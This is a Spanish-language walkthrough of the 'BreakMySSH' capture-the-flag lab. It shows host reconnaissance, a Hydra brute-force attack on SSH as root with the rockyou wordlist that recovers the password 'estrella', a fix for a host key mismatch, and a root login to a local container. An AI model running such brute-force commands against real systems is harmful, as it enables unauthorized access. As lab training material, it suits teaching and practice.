# BreakMySSH

## Reconocimiento Inicial

### Identificación del sistema
- **Ping**: TTL 64 → Sistema Linux
- **Nmap**: Puerto 22 abierto (SSH)

## Acceso por Fuerza Bruta

### Ataque Hydra
Como no se tiene un usuario conocido, se intenta con `root`:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -v
```

**Resultado**: Contraseña encontrada: `estrella`

## Resolución de Problemas de Host Key

### Error inicial
Al intentar conectar aparece un error de host key verification:

```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ED25519 key sent by the remote host is
SHA256:U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ.
Please contact your system administrator.
Add correct host key in /home/kali/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /home/kali/.ssh/known_hosts:3
  remove with:
  ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
Host key for 172.17.0.2 has changed and you have requested strict checking.
Host key verification failed.
```

### Solución

**Paso 1**: Eliminar la clave anterior del archivo `known_hosts`

```bash
ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
```

**Paso 2**: Navegar al directorio SSH y editar el archivo

```bash
cd ~/.ssh
ls
# Output: agent  known_hosts  known_hosts.old

nano known_hosts
```

**Paso 3**: Agregar la nueva fingerprint de la clave ED25519

```
SHA256:U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ
```

## Conexión Exitosa

### Conexión SSH
```bash
ssh root@172.17.0.2
```

**Confirmación de autenticidad**:
```
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
```

**Ingreso de contraseña**:
```
root@172.17.0.2's password: [estrella]
```

### Verificación de acceso
```bash
whoami
# Output: root
```

**Terminal remota accesible**:
```
root@34ed3d3ab280:~# 
```

## Resumen

✅ **Objetivo logrado**: Acceso SSH como usuario `root` en la máquina `172.17.0.2`

| Paso | Acción |
|------|--------|
| 1 | Reconocimiento (ping, nmap) |
| 2 | Ataque de fuerza bruta con Hydra |
| 3 | Resolución de conflicto de host key |
| 4 | Conexión SSH exitosa |
